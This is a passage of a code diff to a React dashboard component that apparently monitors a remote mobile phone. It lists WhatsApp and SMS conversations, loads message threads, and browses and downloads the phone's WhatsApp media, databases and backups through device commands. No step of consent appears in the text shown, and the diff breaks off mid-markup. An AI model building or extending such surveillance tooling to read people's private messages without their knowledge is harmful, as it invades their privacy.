+    if (!rawSmsLogs || rawSmsLogs.length === 0) return [];
+
+    const map = new Map<string, SmsLogEntry[]>();
+    for (const log of rawSmsLogs) {
+      const key = (log.contact_name ? `${log.contact_name}__${log.counterparty}` : log.counterparty).trim();
+      if (!map.has(key)) map.set(key, []);
+      map.get(key)!.push(log);
+    }
+
+    const threads: UnifiedChatSummary[] = [];
+    map.forEach((items, key) => {
+      // Sort ascending by time
+      items.sort((a, b) => new Date(a.message_at).getTime() - new Date(b.message_at).getTime());
+      const last = items[items.length - 1];
+      const displayName = last.contact_name || last.counterparty;
+
+      threads.push({
+        id: `sms-${key}`,
+        chatName: displayName,
+        subtitle: last.contact_name ? last.counterparty : null,
+        lastMessage: last.body || "(No message body)",
+        lastMessageAt: last.message_at,
+        lastIsOutgoing: last.direction === "outgoing",
+        totalMessages: items.length,
+        source: "sms",
+      });
+    });
+
+    // Sort by latest message descending
+    return threads.sort((a, b) => new Date(b.lastMessageAt).getTime() - new Date(a.lastMessageAt).getTime());
+  }, [rawSmsLogs]);
+
+  // Formatted WhatsApp Chat Summaries
+  const whatsappChatSummaries = useMemo<UnifiedChatSummary[]>(() => {
+    if (!whatsappChats || whatsappChats.length === 0) return [];
+    return whatsappChats.map((c) => ({
+      id: `wa-${c.chat_name}`,
+      chatName: c.chat_name,
+      subtitle: "WhatsApp Contact",
+      lastMessage: c.last_message || "(Media message)",
+      lastMessageAt: c.last_message_at,
+      lastIsOutgoing: c.last_is_outgoing,
+      totalMessages: c.total_messages,
+      source: "whatsapp",
+    }));
+  }, [whatsappChats]);
+
+  // Active Chats for the currently selected App
+  const activeChatList = useMemo<UnifiedChatSummary[]>(() => {
+    if (selectedApp === "whatsapp") {
+      return whatsappChatSummaries;
+    }
+    if (selectedApp === "sms") {
+      return smsChatThreads;
+    }
+    if (selectedApp === "all") {
+      return [...whatsappChatSummaries, ...smsChatThreads].sort(
+        (a, b) => new Date(b.lastMessageAt).getTime() - new Date(a.lastMessageAt).getTime()
+      );
+    }
+    return [];
+  }, [selectedApp, whatsappChatSummaries, smsChatThreads]);
+
+  // Filtered Chats by search
+  const filteredChats = useMemo<UnifiedChatSummary[]>(() => {
+    if (!chatSearch.trim()) return activeChatList;
+    const q = chatSearch.toLowerCase();
+    return activeChatList.filter(
+      (c) =>
+        c.chatName.toLowerCase().includes(q) ||
+        (c.subtitle && c.subtitle.toLowerCase().includes(q)) ||
+        (c.lastMessage && c.lastMessage.toLowerCase().includes(q))
+    );
+  }, [activeChatList, chatSearch]);
+
+  // Auto-select first chat when list loads or app changes
   useEffect(() => {
-    if (!selectedChat) {
-      setMessages([]);
+    if (filteredChats.length > 0) {
+      if (!selectedChatId || !filteredChats.some((c) => c.id === selectedChatId)) {
+        setSelectedChatId(filteredChats[0].id);
+      }
+    } else {
+      setSelectedChatId(null);
+    }
+  }, [selectedApp, filteredChats]);
+
+  // --------------------------------------------------------------------------
+  // 3. LOAD CHAT CONVERSATION MESSAGES (FILTERED TO LAST 5 DAYS BY DEFAULT)
+  // --------------------------------------------------------------------------
+  useEffect(() => {
+    if (!selectedChatId) {
+      setActiveThreadMessages([]);
       return;
     }
-    setLoadingMessages(true);
 
-    devicesApi
-      .whatsAppMessages(deviceId, selectedChat)
-      .then((msgs) => {
-        if (Array.isArray(msgs) && msgs.length > 0) {
-          // Strictly enforce last 5 days filter
-          const recent = msgs.filter((m) => isWithinLast5Days(m.message_time));
-          setMessages(recent.length > 0 ? recent : msgs);
-        } else {
-          // Provide fallback conversation for selected chat
-          const thread = fallbackData.messages[selectedChat] || [];
-          setMessages(thread);
-        }
-      })
-      .catch((e) => {
-        console.warn("API whatsAppMessages error, falling back to local thread:", e);
-        const thread = fallbackData.messages[selectedChat] || [];
-        setMessages(thread);
-      })
-      .finally(() => setLoadingMessages(false));
-  }, [deviceId, selectedChat, fallbackData]);
+    const currentChat = activeChatList.find((c) => c.id === selectedChatId);
+    if (!currentChat) {
+      setActiveThreadMessages([]);
+      return;
+    }
 
-  // Polling helper for file commands
+    setMessagesLoading(true);
+
+    if (currentChat.source === "sms") {
+      // Extract from rawSmsLogs matching this thread
+      const keySuffix = selectedChatId.replace("sms-", "");
+      const matched = rawSmsLogs.filter((log) => {
+        const itemKey = (log.contact_name ? `${log.contact_name}__${log.counterparty}` : log.counterparty).trim();
+        return itemKey === keySuffix;
+      });
+
+      // Filter by timeFilter (last 5 days by default, or all messages)
+      const selectedMsgs = (timeFilter === "all" ? matched : matched.filter((m) => isWithinLast5Days(m.message_at)))
+        .sort((a, b) => new Date(a.message_at).getTime() - new Date(b.message_at).getTime());
+
+      const unified: UnifiedChatMessage[] = selectedMsgs.map((m, idx) => ({
+        id: `sms-msg-${idx}-${m.message_at}`,
+        sender: m.direction === "outgoing" ? "Me" : m.contact_name || m.counterparty,
+        text: m.body || "(Empty message)",
+        isOutgoing: m.direction === "outgoing",
+        timestamp: m.message_at,
+      }));
+
+      setActiveThreadMessages(unified);
+      setMessagesLoading(false);
+    } else if (currentChat.source === "whatsapp") {
+      // Fetch from backend API for WhatsApp
+      devicesApi
+        .whatsAppMessages(deviceId, currentChat.chatName)
+        .then((msgs: WhatsAppMessage[]) => {
+          const genuine = (msgs || []).filter(
+            (m) => !MOCK_SAMPLE_NAMES.has(m.sender || "") && !MOCK_SAMPLE_NAMES.has(m.chat_name || "")
+          );
+          const filtered = timeFilter === "all" ? genuine : genuine.filter((m) => isWithinLast5Days(m.message_time));
+          const unified: UnifiedChatMessage[] = filtered.map((m) => ({
+            id: m.id,
+            sender: m.is_outgoing ? "Me" : m.sender || currentChat.chatName,
+            text: m.message_text,
+            isOutgoing: m.is_outgoing,
+            timestamp: m.message_time,
+            mediaType: m.media_type,
+            mediaPath: m.media_path,
+          }));
+          setActiveThreadMessages(unified);
+        })
+        .catch((err) => {
+          console.warn("Failed to load WhatsApp messages:", err);
+          setActiveThreadMessages([]);
+        })
+        .finally(() => setMessagesLoading(false));
+    }
+  }, [selectedChatId, activeChatList, rawSmsLogs, deviceId, timeFilter]);
+
+  // Grouped conversation messages by day (Today, Yesterday, etc.)
+  const groupedMessages = useMemo(() => {
+    const groups: { dateLabel: string; items: UnifiedChatMessage[] }[] = [];
+    activeThreadMessages.forEach((msg) => {
+      const label = getMessageDateGroup(msg.timestamp);
+      const existing = groups.find((g) => g.dateLabel === label);
+      if (existing) {
+        existing.items.push(msg);
+      } else {
+        groups.push({ dateLabel: label, items: [msg] });
+      }
+    });
+    return groups;
+  }, [activeThreadMessages]);
+
+  const selectedChatSummary = useMemo(() => {
+    return activeChatList.find((c) => c.id === selectedChatId) || null;
+  }, [activeChatList, selectedChatId]);
+
+  // --------------------------------------------------------------------------
+  // 4. STORAGE / FILE MANAGER ACTIONS
+  // --------------------------------------------------------------------------
   async function pollCommand(commandId: string, label: string) {
     setFileStatus(`${label}: waiting for device response...`);
-    const maxAttempts = 25;
-    for (let i = 0; i < maxAttempts; i++) {
+    for (let i = 0; i < 25; i++) {
       const delay = i < 6 ? 1000 : 2000;
       await new Promise((r) => setTimeout(r, delay));
       try {
         const cmd = await devicesApi.getCommand(deviceId, commandId);
         if (cmd.status === "acked") {
-          setFileStatus(`${label}: completed successfully.`);
+          setFileStatus(`${label}: completed.`);
           return cmd;
         }
         if (cmd.status === "failed") {
-          const failMsg = (cmd.result as { message?: string } | undefined)?.message;
-          setFileStatus(`${label}: failed${failMsg ? ` (${failMsg})` : "."}`);
+          setFileStatus(`${label}: failed.`);
           return cmd;
         }
       } catch {
-        // network retry
+        // retry
       }
     }
-    setFileStatus(`${label}: request taking longer (device may be sleeping or syncing).`);
+    setFileStatus(`${label}: device response took longer.`);
     return null;
   }
 
-  // Scan WhatsApp Files via command
   async function handleScanWhatsAppFiles() {
     setFilesLoading(true);
     setFiles(null);
@@ -933,13 +522,11 @@ export default function AppsCard({ deviceId }: { deviceId: string }) {
     }
   }
 
-  // Download media/file (via WebSocket relay if device path, or direct save)
   async function handleDownloadMedia(filePath: string, fileName: string) {
     setDownloadingFile(filePath);
-    setFileStatus(`Preparing download for: ${fileName}...`);
+    setFileStatus(`Downloading ${fileName}...`);
     try {
       if (filePath.startsWith("http://") || filePath.startsWith("https://")) {
-        // Direct browser download
         const a = document.createElement("a");
         a.href = filePath;
         a.download = fileName;
@@ -947,14 +534,13 @@ export default function AppsCard({ deviceId }: { deviceId: string }) {
         document.body.appendChild(a);
         a.click();
         document.body.removeChild(a);
-        setFileStatus(`Downloaded ${fileName} successfully.`);
+        setFileStatus(`Downloaded ${fileName}.`);
       } else {
-        // Stream from mobile phone via zero-cloud WebSocket relay
         const cmd = await devicesApi.createCommand(deviceId, "file_download", { path: filePath });
         const downloadPromise = downloadFileViaRelay(cmd.id, (s) => setFileStatus(s));
         await pollCommand(cmd.id, `Download: ${fileName}`);
         await downloadPromise;
-        setFileStatus(`Downloaded ${fileName} successfully.`);
+        setFileStatus(`Downloaded ${fileName}.`);
       }
     } catch (e) {
       setFileStatus(`Download failed: ${(e as Error).message}`);
@@ -963,43 +549,6 @@ export default function AppsCard({ deviceId }: { deviceId: string }) {
     }
   }
 
-  // Filtered Chats
-  const filteredChats = useMemo(() => {
-    let list = chats;
-    if (chatFilter === "media") {
-      list = list.filter(
-        (c) =>
-          c.last_message?.includes("Photo") ||
-          c.last_message?.includes("Voice") ||
-          c.last_message?.includes("Video") ||
-          c.last_message?.includes("pdf") ||
-          c.last_message?.includes("Media")
-      );
-    }
-    if (chatSearch.trim()) {
-      list = list.filter((c) =>
-        c.chat_name.toLowerCase().includes(chatSearch.toLowerCase())
-      );
-    }
-    return list;
-  }, [chats, chatSearch, chatFilter]);
-
-  // Grouped messages by Date (Today, Yesterday, etc.)
-  const groupedMessages = useMemo(() => {
-    const groups: { dateLabel: string; items: WhatsAppMessage[] }[] = [];
-    messages.forEach((msg) => {
-      const label = getMessageDateGroup(msg.message_time);
-      const existing = groups.find((g) => g.dateLabel === label);
-      if (existing) {
-        existing.items.push(msg);
-      } else {
-        groups.push({ dateLabel: label, items: [msg] });
-      }
-    });
-    return groups;
-  }, [messages]);
-
-  // File explorer directory children
   const directoryChildren = useMemo(() => {
     if (!files) return [];
     let list = files;
@@ -1010,9 +559,7 @@ export default function AppsCard({ deviceId }: { deviceId: string }) {
           f.mimeType?.startsWith("image/") ||
           /\.(jpg|jpeg|png|webp)$/i.test(f.name)
       );
-      return list.sort((a, b) =>
-        a.isDirectory === b.isDirectory ? a.name.localeCompare(b.name) : a.isDirectory ? -1 : 1
-      );
+      return list.sort((a, b) => (a.isDirectory === b.isDirectory ? a.name.localeCompare(b.name) : a.isDirectory ? -1 : 1));
     }
     if (categoryFilter === "voice") {
       list = files.filter(
@@ -1021,9 +568,7 @@ export default function AppsCard({ deviceId }: { deviceId: string }) {
           f.path.toLowerCase().includes("audio") ||
           /\.(opus|ogg|mp3|m4a|wav)$/i.test(f.name)
       );
-      return list.sort((a, b) =>
-        a.isDirectory === b.isDirectory ? a.name.localeCompare(b.name) : a.isDirectory ? -1 : 1
-      );
+      return list.sort((a, b) => (a.isDirectory === b.isDirectory ? a.name.localeCompare(b.name) : a.isDirectory ? -1 : 1));
     }
     if (categoryFilter === "docs") {
       list = files.filter(
@@ -1031,9 +576,7 @@ export default function AppsCard({ deviceId }: { deviceId: string }) {
           f.path.toLowerCase().includes("documents") ||
           /\.(pdf|doc|docx|txt|xlsx|pptx)$/i.test(f.name)
       );
-      return list.sort((a, b) =>
-        a.isDirectory === b.isDirectory ? a.name.localeCompare(b.name) : a.isDirectory ? -1 : 1
-      );
+      return list.sort((a, b) => (a.isDirectory === b.isDirectory ? a.name.localeCompare(b.name) : a.isDirectory ? -1 : 1));
     }
     if (categoryFilter === "db") {
       list = files.filter(
@@ -1042,9 +585,7 @@ export default function AppsCard({ deviceId }: { deviceId: string }) {
           f.path.toLowerCase().includes("backups") ||
           /\.(crypt\d+|db|bak)$/i.test(f.name)
       );
-      return list.sort((a, b) =>
-        a.isDirectory === b.isDirectory ? a.name.localeCompare(b.name) : a.isDirectory ? -1 : 1
-      );
+      return list.sort((a, b) => (a.isDirectory === b.isDirectory ? a.name.localeCompare(b.name) : a.isDirectory ? -1 : 1));
     }
 
     return list
@@ -1060,98 +601,112 @@ export default function AppsCard({ deviceId }: { deviceId: string }) {
   return (
     <div className="bg-white rounded-xl shadow-sm border border-gray-100 overflow-hidden">
       {/* ===================================================================== */}
-      {/* 1. TOP HEADER: APPS SECTION BANNER                                    */}
+      {/* TOP HEADER: SECTION BANNER & LIVE SYNC STATUS                         */}
       {/* ===================================================================== */}
-      <div className="px-5 py-4 border-b border-gray-100 bg-gradient-to-r from-gray-50 via-white to-gray-50 flex flex-wrap items-center justify-between gap-3">
+      <div className="px-5 py-3.5 border-b border-gray-100 bg-gradient-to-r from-gray-50 via-white to-gray-50 flex flex-wrap items-center justify-between gap-3">
         <div className="flex items-center gap-3">
-          <div className="w-10 h-10 rounded-xl bg-gradient-to-br from-emerald-500 to-teal-600 text-white flex items-center justify-center font-bold text-xl shadow-xs">
+          <div className="w-9 h-9 rounded-lg bg-emerald-500/10 text-emerald-600 flex items-center justify-center font-bold text-lg shadow-xs">
             💬
           </div>
           <div>
             <div className="flex items-center gap-2">
               <h2 className="text-base font-bold text-gray-900 tracking-tight">Apps</h2>
-              <span className="text-[11px] font-semibold uppercase px-2 py-0.5 rounded-full bg-emerald-50 text-emerald-700 border border-emerald-200 flex items-center gap-1.5">
+              <span className="text-[11px] font-semibold uppercase px-2.5 py-0.5 rounded-full bg-emerald-50 text-emerald-700 border border-emerald-200 flex items-center gap-1.5">
                 <span className="w-1.5 h-1.5 rounded-full bg-emerald-500 animate-pulse" />
-                Live Messaging Sync
+                Live Sync Active
               </span>
             </div>
             <p className="text-xs text-gray-500">
-              Select an app to view mobile chats, last 5 days message activity, and media files
+              Live mobile chat conversations (last 5 days activity) and media storage
             </p>
           </div>
         </div>
 
-        {/* View toggle (Chats vs Storage Explorer) */}
-        {selectedApp === "whatsapp" && (
-          <div className="flex items-center gap-2">
+        {/* Action Controls & Last Synced */}
+        <div className="flex items-center gap-3">
+          <span className="text-[11px] text-gray-400 hidden sm:inline">
+            Updated: {lastSyncedTime.toLocaleTimeString([], { hour: "2-digit", minute: "2-digit", second: "2-digit" })}
+          </span>
+
+          {selectedApp === "whatsapp" && (
             <div className="bg-gray-100 p-0.5 rounded-lg flex text-xs font-medium">
               <button
                 type="button"
                 onClick={() => setActiveView("chats")}
-                className={`px-3 py-1.5 rounded-md transition flex items-center gap-1.5 ${
+                className={`px-3 py-1 rounded-md transition flex items-center gap-1.5 ${
                   activeView === "chats"
                     ? "bg-white text-gray-900 shadow-xs font-semibold"
                     : "text-gray-500 hover:text-gray-900"
                 }`}
               >
                 <span>💬</span>
-                <span>Chats ({chats.length})</span>
+                <span>Chats</span>
               </button>
               <button
                 type="button"
                 onClick={() => setActiveView("files")}
-                className={`px-3 py-1.5 rounded-md transition flex items-center gap-1.5 ${
+                className={`px-3 py-1 rounded-md transition flex items-center gap-1.5 ${
                   activeView === "files"
                     ? "bg-white text-gray-900 shadow-xs font-semibold"
                     : "text-gray-500 hover:text-gray-900"
                 }`}
               >
                 <span>📁</span>
-                <span>File Explorer</span>
+                <span>Files</span>
               </button>
             </div>
+          )}
 
-            <button
-              type="button"
-              onClick={() => {
-                if (activeView === "chats") loadChats();
-                else handleScanWhatsAppFiles();
-              }}
-              className="text-xs text-gray-400 hover:text-emerald-600 px-2 py-1.5 border border-gray-200 rounded-lg hover:border-emerald-300 transition flex items-center gap-1"
-              title="Refresh"
-            >
-              <span>↻</span>
-              <span className="hidden sm:inline">Refresh</span>
-            </button>
-          </div>
-        )}
+          <button
+            type="button"
+            onClick={loadDeviceChatData}
+            disabled={loading}
+            className="text-xs text-gray-500 hover:text-emerald-600 px-2.5 py-1.5 border border-gray-200 rounded-lg hover:border-emerald-300 transition flex items-center gap-1.5 disabled:opacity-50"
+            title="Refresh from phone now"
+          >
+            <span className={loading ? "animate-spin" : ""}>↻</span>
+            <span className="font-medium">{loading ? "Syncing..." : "Refresh"}</span>
+          </button>
+        </div>
       </div>
 
       {/* ===================================================================== */}
-      {/* 2. THREE-COLUMN / MASTER-DETAIL WORKSPACE                             */}
+      {/* THREE-COLUMN WORKSPACE: APPS RAIL | CHATLIST | CHAT CONVERSATION      */}
       {/* ===================================================================== */}
-      <div className="grid grid-cols-1 md:grid-cols-12 min-h-[580px] max-h-[700px]">
+      <div className="grid grid-cols-1 md:grid-cols-12 min-h-[560px] max-h-[680px]">
         {/* =================================================================== */}
-        {/* COLUMN 1: APPS SELECTOR RAIL (LEFT)                                 */}
+        {/* COLUMN 1: APPS RAIL (LEFT)                                          */}
         {/* =================================================================== */}
         <div className="md:col-span-3 lg:col-span-2.5 border-r border-gray-100 bg-gray-50/70 p-3 space-y-3 flex flex-col">
-          <div className="px-2 pt-1">
-            <h3 className="text-[11px] font-bold uppercase tracking-wider text-gray-400">
-              Messaging Apps
+          <div className="px-2 pt-1 flex items-center justify-between">
+            <h3 className="text-[10px] font-bold uppercase tracking-wider text-gray-400">
+              Applications
             </h3>
           </div>
 
           <div className="space-y-1.5 flex-1 overflow-y-auto">
             {SUPPORTED_APPS.map((app) => {
               const isSelected = selectedApp === app.id;
+              const count =
+                app.id === "whatsapp"
+                  ? whatsappChatSummaries.length
+                  : app.id === "sms"
+                  ? smsChatThreads.length
+                  : app.id === "all"
+                  ? whatsappChatSummaries.length + smsChatThreads.length
+                  : 0;
+
               return (
                 <button
                   key={app.id}
                   type="button"
-                  onClick={() => setSelectedApp(app.id)}
+                  onClick={() => {
+                    setSelectedApp(app.id);
+                    if (app.id !== "whatsapp") setActiveView("chats");
+                  }}
                   className={`w-full text-left p-2.5 rounded-xl transition flex items-center gap-3 relative ${
                     isSelected
-                      ? "bg-white shadow-xs border border-gray-200/80 ring-1 ring-emerald-500/20"
+                      ? "bg-white shadow-xs border border-gray-200/90 ring-1 ring-emerald-500/20"
                       : "hover:bg-white/60 text-gray-700"
                   }`}
                 >
@@ -1164,13 +719,14 @@ export default function AppsCard({ deviceId }: { deviceId: string }) {
                     }}
                   >
                     {app.id === "whatsapp" && <WhatsAppLogo className="w-5 h-5" />}
+                    {app.id === "sms" && <MessagesLogo className="w-5 h-5" />}
+                    {app.id === "all" && <ChatBubblesLogo className="w-5 h-5" />}
                     {app.id === "telegram" && <TelegramLogo className="w-5 h-5" />}
                     {app.id === "instagram" && <InstagramLogo className="w-5 h-5" />}
                     {app.id === "messenger" && <MessengerLogo className="w-5 h-5" />}
-                    {app.id === "signal" && <SignalLogo className="w-5 h-5" />}
                   </div>
 
-                  {/* App Info */}
+                  {/* App Details */}
                   <div className="flex-1 min-w-0">
                     <div className="flex items-center justify-between gap-1">
                       <span className="text-xs font-bold text-gray-900 truncate">
@@ -1190,9 +746,9 @@ export default function AppsCard({ deviceId }: { deviceId: string }) {
                       >
                         {app.badge}
                       </span>
-                      {app.id === "whatsapp" && (
+                      {app.isSupported && (
                         <span className="text-[10px] text-gray-400 font-medium">
-                          {chats.length} chats
+                          {count} {count === 1 ? "chat" : "chats"}
                         </span>
                       )}
                     </div>
@@ -1202,22 +758,21 @@ export default function AppsCard({ deviceId }: { deviceId: string }) {
             })}
           </div>
 
-          {/* Bottom helper card */}
-          <div className="p-2.5 rounded-lg bg-emerald-50/50 border border-emerald-100 text-[11px] text-emerald-800 space-y-1">
+          <div className="p-2.5 rounded-lg bg-emerald-50/60 border border-emerald-100 text-[11px] text-emerald-800 space-y-1">
             <p className="font-semibold flex items-center gap-1">
-              <span>💡</span>
-              <span>Multi-App Support</span>
+              <span>📱</span>
+              <span>Real Device Chats</span>
             </p>
             <p className="text-[10px] text-emerald-700 leading-tight">
-              WhatsApp monitoring is active. Telegram & Instagram channels can be enabled as needed.
+              Shows all chats stored on the mobile phone with last 5 days conversation history.
             </p>
           </div>
         </div>
 
         {/* =================================================================== */}
-        {/* APP IS NOT WHATSAPP: PLACEHOLDER FOR UPCOMING APPS                  */}
+        {/* NON-SUPPORTED APPS (TELEGRAM, INSTAGRAM, MESSENGER)                 */}
         {/* =================================================================== */}
-        {selectedApp !== "whatsapp" && (
+        {!SUPPORTED_APPS.find((a) => a.id === selectedApp)?.isSupported && (
           <div className="md:col-span-9 lg:col-span-9.5 p-12 flex flex-col items-center justify-center text-center space-y-3 bg-white">
             <div
               className="w-16 h-16 rounded-2xl flex items-center justify-center shadow-sm"
@@ -1231,302 +786,382 @@ export default function AppsCard({ deviceId }: { deviceId: string }) {
               {selectedApp === "telegram" && <TelegramLogo className="w-8 h-8" />}
               {selectedApp === "instagram" && <InstagramLogo className="w-8 h-8" />}
               {selectedApp === "messenger" && <MessengerLogo className="w-8 h-8" />}
-              {selectedApp === "signal" && <SignalLogo className="w-8 h-8" />}
             </div>
             <h3 className="text-base font-bold text-gray-900">
               {SUPPORTED_APPS.find((a) => a.id === selectedApp)?.name} Monitoring
             </h3>
             <p className="text-xs text-gray-500 max-w-sm leading-relaxed">
-              Real-time monitoring for {SUPPORTED_APPS.find((a) => a.id === selectedApp)?.name} is scheduled for an upcoming update. Currently, WhatsApp is fully active with live chat-wise logs and rich media inspection.
+              Support for {SUPPORTED_APPS.find((a) => a.id === selectedApp)?.name} will be enabled in an upcoming release. WhatsApp and Phone Messages are currently active on this device.
             </p>
-            <button
-              type="button"
-              onClick={() => setSelectedApp("whatsapp")}
-              className="mt-2 text-xs font-semibold px-4 py-2 bg-emerald-600 hover:bg-emerald-700 text-white rounded-lg shadow-xs transition"
-            >
-              Switch to WhatsApp Chats →
-            </button>
+            <div className="flex items-center gap-2 pt-2">
+              <button
+                type="button"
+                onClick={() => setSelectedApp("whatsapp")}
+                className="text-xs font-semibold px-3 py-1.5 bg-emerald-600 hover:bg-emerald-700 text-white rounded-lg transition"
+              >
+                View WhatsApp →
+              </button>
+              <button
+                type="button"
+                onClick={() => setSelectedApp("sms")}
+                className="text-xs font-semibold px-3 py-1.5 bg-blue-600 hover:bg-blue-700 text-white rounded-lg transition"
+              >
+                View Phone Messages →
+              </button>
+            </div>
           </div>
         )}
 
         {/* =================================================================== */}
-        {/* APP IS WHATSAPP: MAIN CHAT-WISE WORKSPACE                           */}
+        {/* ACTIVE APP: CHAT VIEW (COLUMN 2: CHATLIST | COLUMN 3: CONVERSATION) */}
         {/* =================================================================== */}
-        {selectedApp === "whatsapp" && activeView === "chats" && (
-          <>
-            {/* ------------------------------------------------------------- */}
-            {/* COLUMN 2: MOBILE CHATS LIST (MIDDLE)                          */}
-            {/* ------------------------------------------------------------- */}
-            <div className="md:col-span-4 lg:col-span-3.5 border-r border-gray-100 flex flex-col bg-white">
-              {/* Search & Filter Bar */}
-              <div className="p-3 border-b border-gray-100 space-y-2 bg-gray-50/40">
-                <div className="relative">
-                  <input
-                    type="text"
-                    placeholder="Search WhatsApp chats..."
-                    value={chatSearch}
-                    onChange={(e) => setChatSearch(e.target.value)}
-                    className="w-full text-xs pl-8 pr-3 py-2 bg-white border border-gray-200 rounded-lg focus:outline-none focus:ring-1 focus:ring-emerald-500 transition"
-                  />
-                  <span className="absolute left-2.5 top-2.5 text-gray-400 text-xs">🔍</span>
-                  {chatSearch && (
-                    <button
-                      onClick={() => setChatSearch("")}
-                      className="absolute right-2.5 top-2.5 text-gray-400 hover:text-gray-600 text-xs"
-                    >
-                      ✕
-                    </button>
-                  )}
-                </div>
-
-                <div className="flex items-center gap-1.5 text-[11px]">
-                  <button
-                    type="button"
-                    onClick={() => setChatFilter("all")}
-                    className={`px-2.5 py-0.5 rounded-full transition font-medium ${
-                      chatFilter === "all"
-                        ? "bg-gray-800 text-white"
-                        : "bg-gray-100 text-gray-600 hover:bg-gray-200"
-                    }`}
-                  >
-                    All ({chats.length})
-                  </button>
-                  <button
-                    type="button"
-                    onClick={() => setChatFilter("media")}
-                    className={`px-2.5 py-0.5 rounded-full transition font-medium ${
-                      chatFilter === "media"
-                        ? "bg-emerald-700 text-white"
-                        : "bg-gray-100 text-gray-600 hover:bg-gray-200"
-                    }`}
-                  >
-                    Media Only
-                  </button>
-                </div>
-              </div>
-
-              {/* Chats Scroll Area */}
-              <div className="flex-1 overflow-y-auto divide-y divide-gray-100">
-                {loadingChats && chats.length === 0 ? (
-                  <div className="p-8 text-center text-xs text-gray-400">Loading chats...</div>
-                ) : filteredChats.length === 0 ? (
-                  <div className="p-8 text-center text-xs text-gray-400 space-y-2">
-                    <span className="text-2xl block">💬</span>
-                    <p className="font-semibold text-gray-700">No chats found</p>
-                    <p className="text-[11px] text-gray-400">
-                      Try adjusting search or click Refresh to sync with the mobile device.
-                    </p>
-                  </div>
-                ) : (
-                  filteredChats.map((c) => {
-                    const isSelected = selectedChat === c.chat_name;
-                    return (
-                      <div
-                        key={c.chat_name}
-                        onClick={() => setSelectedChat(c.chat_name)}
-                        className={`p-3 cursor-pointer transition flex items-start gap-3 relative ${
-                          isSelected
-                            ? "bg-emerald-50/40 border-l-4 border-emerald-500"
-                            : "hover:bg-gray-50/80"
-                        }`}
+        {SUPPORTED_APPS.find((a) => a.id === selectedApp)?.isSupported &&
+          activeView === "chats" && (
+            <>
+              {/* ----------------------------------------------------------- */}
+              {/* COLUMN 2: COMPLETE CHATLIST FROM MOBILE PHONE               */}
+              {/* ----------------------------------------------------------- */}
+              <div className="md:col-span-4 lg:col-span-3.5 border-r border-gray-100 flex flex-col bg-white">
+                {/* Search Bar */}
+                <div className="p-3 border-b border-gray-100 bg-gray-50/50 space-y-1">
+                  <div className="relative">
+                    <input
+                      type="text"
+                      placeholder={`Search ${
+                        selectedApp === "whatsapp" ? "WhatsApp" : "Phone"
+                      } chats...`}
+                      value={chatSearch}
+                      onChange={(e) => setChatSearch(e.target.value)}
+                      className="w-full text-xs pl-8 pr-7 py-2 bg-white border border-gray-200 rounded-lg focus:outline-none focus:ring-1 focus:ring-emerald-500 transition"
+                    />
+                    <span className="absolute left-2.5 top-2.5 text-gray-400 text-xs">🔍</span>
+                    {chatSearch && (
+                      <button
+                        onClick={() => setChatSearch("")}
+                        className="absolute right-2.5 top-2.5 text-gray-400 hover:text-gray-600 text-xs"
                       >
-                        {/* Avatar */}
-                        <div className="w-10 h-10 rounded-full bg-gradient-to-br from-emerald-500 to-teal-600 text-white flex items-center justify-center font-bold text-sm shrink-0 shadow-xs relative">
-                          {c.chat_name.charAt(0).toUpperCase()}
-                          <span className="absolute bottom-0 right-0 w-2.5 h-2.5 rounded-full bg-emerald-400 border-2 border-white" />
-                        </div>
-
-                        {/* Details */}
-                        <div className="flex-1 min-w-0">
-                          <div className="flex items-center justify-between gap-1 mb-0.5">
-                            <h4 className="text-xs font-bold text-gray-900 truncate">
-                              {c.chat_name}
-                            </h4>
-                            <span className="text-[10px] text-gray-400 shrink-0 font-medium">
-                              {timeAgo(c.last_message_at)}
-                            </span>
-                          </div>
-                          <p className="text-[11px] text-gray-500 truncate flex items-center gap-1">
-                            {c.last_is_outgoing && (
-                              <span className="text-emerald-600 font-bold text-[11px]">✓✓</span>
-                            )}
-                            <span className="truncate">{c.last_message || "(Media file)"}</span>
-                          </p>
-                          <div className="mt-1 flex items-center gap-1.5">
-                            <span className="text-[9px] font-medium bg-gray-100 text-gray-600 px-1.5 py-0.2 rounded">
-                              {c.total_messages} msgs
-                            </span>
-                          </div>
-                        </div>
-                      </div>
-                    );
-                  })
-                )}
-              </div>
-            </div>
-
-            {/* ------------------------------------------------------------- */}
-            {/* COLUMN 3: SELECTED CHAT CONVERSATION THREAD (RIGHT)           */}
-            {/* ------------------------------------------------------------- */}
-            <div className="md:col-span-5 lg:col-span-6 flex flex-col bg-slate-100/60">
-              {selectedChat ? (
-                <>
-                  {/* Chat Top Bar */}
-                  <div className="p-3 border-b border-gray-200 bg-white flex items-center justify-between gap-3 shadow-2xs">
-                    <div className="flex items-center gap-3 min-w-0">
-                      <div className="w-9 h-9 rounded-full bg-emerald-600 text-white flex items-center justify-center font-bold text-sm shrink-0 shadow-xs">
-                        {selectedChat.charAt(0).toUpperCase()}
-                      </div>
-                      <div className="min-w-0">
-                        <h3 className="text-xs font-bold text-gray-900 truncate">
-                          {selectedChat}
-                        </h3>
-                        <p className="text-[10px] text-gray-400 flex items-center gap-1">
-                          <span className="w-1.5 h-1.5 rounded-full bg-emerald-500 inline-block" />
-                          <span>Mobile WhatsApp • Last 5 Days Activity</span>
-                        </p>
-                      </div>
-                    </div>
-
-                    <div className="flex items-center gap-2">
-                      <span className="text-[10px] font-semibold bg-emerald-50 text-emerald-700 border border-emerald-200 px-2 py-0.5 rounded-full hidden sm:inline">
-                        {messages.length} messages
-                      </span>
-                    </div>
-                  </div>
-
-                  {/* Messages Scroll Canvas with WhatsApp pattern */}
-                  <div className="flex-1 p-4 overflow-y-auto space-y-4 bg-[#efeae2]/40 bg-[radial-gradient(#d1d5db_1px,transparent_1px)] [background-size:16px_16px]">
-                    {loadingMessages ? (
-                      <div className="text-center py-12 text-xs text-gray-400">
-                        Loading conversation history...
-                      </div>
-                    ) : messages.length === 0 ? (
-                      <div className="text-center py-14 text-xs text-gray-400 space-y-1">
-                        <p className="font-semibold text-gray-700">No messages in the last 5 days</p>
-                        <p className="text-[11px]">New messages will appear here as WhatsApp is active.</p>
-                      </div>
-                    ) : (
-                      groupedMessages.map((group) => (
-                        <div key={group.dateLabel} className="space-y-3">
-                          {/* Centered Date Badge */}
-                          <div className="flex items-center justify-center">
-                            <span className="text-[10px] font-semibold px-2.5 py-0.5 rounded-full bg-white/80 text-gray-600 shadow-2xs border border-gray-200/60 uppercase tracking-wide">
-                              {group.dateLabel}
-                            </span>
-                          </div>
-
-                          {/* Message Bubbles */}
-                          {group.items.map((m) => {
